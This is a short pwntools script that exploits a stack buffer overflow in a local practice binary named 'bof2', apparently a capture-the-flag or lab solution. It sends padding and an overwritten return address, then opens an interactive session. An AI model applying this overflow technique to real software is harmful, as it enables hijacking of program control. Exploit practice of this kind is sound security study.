from pwn import*
r = process("./bof2")
shellcode = "A"*0xf+p8(0)+"A"*0x8+p64(0x4006ac)
r.recvline()
r.sendline(shellcode)
r.interactive()
